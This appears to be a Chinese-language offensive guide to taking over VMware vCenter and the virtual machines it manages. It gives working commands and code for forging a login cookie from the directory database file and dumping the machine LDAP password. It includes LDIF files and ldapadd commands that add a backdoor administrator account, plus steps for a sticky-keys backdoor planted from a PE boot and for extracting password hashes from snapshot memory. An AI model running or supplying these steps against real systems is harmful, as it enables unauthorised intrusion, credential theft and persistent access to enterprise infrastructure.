## vcenter简介

esxi相当于vmware workstation，可以在上面开虚拟机，esxi也有单独的网页可以管理里面的虚拟机。vcenter相当于一个vmware workstation集群的管理工具，在vcenter中可以看见所有的esxi中的虚拟机。其中vcenter自己的认证信息是放在ldap中的，esxi的账号密码以及虚拟机等信息是存放在PostgreSQL中的，Postgre的配置文件位置如下。

linux:

/etc/vmware-vpx/vcdb.properties

windows:

C:\programdata\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties

 

![stickPicture.png](assets/clip_image002.gif)

## 获取vcenter服务权限

这一步可以分为cve获取vcenter权限和通过管理员pc上保存的账号密码获取vcenter的权限，如果是通过管理员pc获取的vcenter权限就可以直接登录了。但如果是cve获取的vcenter权限一般情况都是vcenter服务器的权限，不是vcenter的权限。如果要通过vcenter服务器获取vcenter的权限可以通过cookie，或者添加账号的方式获取vcenter权限。

**使用cookie获取vcenter权限**

下载服务器中的mdb文件，然后使用https://github.com/horizon3ai/vcenter_saml_login获取cookie

mdb位置：

Linux：/storage/db/vmware-vmdir/data.mdb

windows：C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb

kali使用脚本时会会出错，使用以下命令安装依赖：

apt-get install build-essential python3-dev libldap2-dev libsasl2-dev slapd ldap-utils tox lcov valgrind

因为该脚本需要和vcenter交互，所以如果vcenter在内网则需要使用proxycahins代理该脚本。

获取cookie：

python3 vcenter_saml_login.py -p data.mdb -t [vcenter ip]

获取vcenter的cookie后可以在chrome的Application中编辑cookie，然后刷新就能成功登录了。

 

![stickPicture.png](assets/clip_image004.gif)

**通过添加账号的方式获取vcenter权限**

获取ldap的账号密码

linux列ldap信息：

/opt/likewise/bin/lwregshell list_values '[HKEY_THIS_MACHINE\services\vmdir]'

 

windows列ldap信息: 

reg query '\\HKEY_THIS_MACHINE\\services\\vmdir'

reg query "HKLM\SYSTEM\CurrentControlSet\services\VMwareDirectoryService" 
 

C:\Program Files\VMware\vCenter Server\python\python.exe ldap.py

import vmafd

client=vmafd.client('localhost')

domain_name = client.GetDomainName().split(".")

print("cn=" + client.GetMachineName() + ",ou=Domain Controllers,dc=" + domain_name[0] + ",dc=" + domain_name[1])

print("ldap password: " + client.GetMachinePassword())

 

![stickPicture.png](assets/clip_image006.gif)

dcAccountDN和dcAccountPassword分别为ldap的连接账号密码。可使用ldap连接工具或ldap命令来实现添加用户，删除用户等操作。添加vcenter用户和添加windows用户一样，需要先添加用户再将用户添加到管理员组。

添加用户前需要先创建两个文件。

adduser.ldif

dn: CN=vcenterAccount,CN=Users,DC=vsphere,dc=local

userPrincipalName: vcenterAccount@vsphere.local

sAMAccountName: vcenterAccount

cn: vcenterAccount

objectClass: top

objectClass: person

objectClass: organizationalPerson

objectClass: user

userPassword: G%2kX@PjYn%Jy$Nb

addadmin.ldif

dn: cn=Administrators,cn=Builtin,dc=vsphere,dc=local

changetype: modify

add: member

member: CN=vcenterAccount,CN=Users,DC=vsphere,dc=local

使用命令行操作：

添加用户：

ldapadd -x -H ldap://192.168.1.1:389 -D '[dcAccountDN]' -w '[dcAccountPassword]' -f adduser.ldif

添加管理员：

ldapadd -x -H ldap://192.168.1.1:389 -D '[dcAccountDN]' -w '[dcAccountPassword]' -f addadmin.ldif

使用工具操作添加用户(ldap admin)：

 

 

![stickPicture.png](assets/clip_image008.gif)

![stickPicture.png](assets/clip_image010.gif)

![stickPicture.png](assets/clip_image012.gif)

将前面的adduser.ldif，addadmin.ldif导入进去即可。使用其他工具的时候可能会出现问题，建议使用同款工具。所有用户可以在dc=local/dc=vsphere/cn=users中看见，当然也可以右击直接删除。管理员可以在dc=local/dc=vsphere/cn=Builtin/cn=Administrators中的member字段中看见。

## 利用vcenter进入系统

### windows系统

要进入windows主要有两种方法，第一是使用pe结合shift后门进入系统，缺点是需要重启系统。第二是使用快照，从快照中获取到lsass进程，然后找到hash再登录主机。

l pe结合shift

 

先把pe文件上传到vcenter中。然后在CD/DVD驱动器中选择刚刚上传的pe。最后在虚拟机选项中的引导选项勾选强制进入bios，保存后即可打开虚拟机电源。

 

 

![stickPicture.png](assets/clip_image014.gif)

![stickPicture.png](assets/clip_image016.gif)

![stickPicture.png](assets/clip_image018.gif)

进入bios后在boot中按-+调整顺序，将CD-ROM Drive设置为第一启动项，最好按F10保存即可进入pe。

 

![stickPicture.png](assets/clip_image020.gif)

进入PE后在windows/system32中将sethc.exe改为sethc.bak，再复制一个cmd并重命名为sethc.exe，然后重新勾选强制进入bios，重启后将CD-ROM Drive改回去，然后按五次shift就可以弹出cmd了。

 

![stickPicture.png](assets/clip_image022.gif)

 

![stickPicture.png](assets/clip_image024.gif)

同样的操作，也可以直接把马放在pe里面，然后复制进主机里面。都进PE了操作可以很多。

l 快照获取hash

 

给对应的虚拟机打上快照，然后将快照文件下载回来，快照文件的后缀是vmem。需要注意的是虚拟机内存有多大，快照就有多大，所以有点难受。可以通过web查看虚拟机文件夹的形式下载vmem文件和vmsn文件。

 

![stickPicture.png](assets/clip_image026.gif)

![stickPicture.png](assets/clip_image028.gif)

拿到文件之后用vmss2core将文件转换为dmp文件。

vmss2core -W xxx.vmsn xxx.vmem //虚拟机小于windows2012

vmss2core -W8 xxx.vmsn xxx.vmem //大于等于2012

然后使用https://github.com/volatilityfoundation/volatility3提取hash，或者安装mimikatz插件直接提取明文。

 

![stickPicture.png](assets/clip_image030.gif)

l 其他方式

l 将快照文件下载到内网中已经使用获取到权限的主机上，再把工具丢上去提取密码。

l 将虚拟机克隆，然后使用pe进入克隆的虚拟机中操作。

**最后**：每种方式都有利弊

第一种直接进pe需要重启，容易把服务搞坏。

第二种如果文件太大，代理不稳就很难实现

最后两种实用性稍微高一点。

### Linux

Linux基本也就是克隆然后把克隆的机器重启，然后参考Linux忘记密码的操作进入bash然后查看shadow再把hash放到cmd5上看看能不能破解出来。解不出来可以翻翻文件什么的，从其他服务看看嫩不能进去。

Linux中内存看不见密码，内存中的信息可以参考volatility。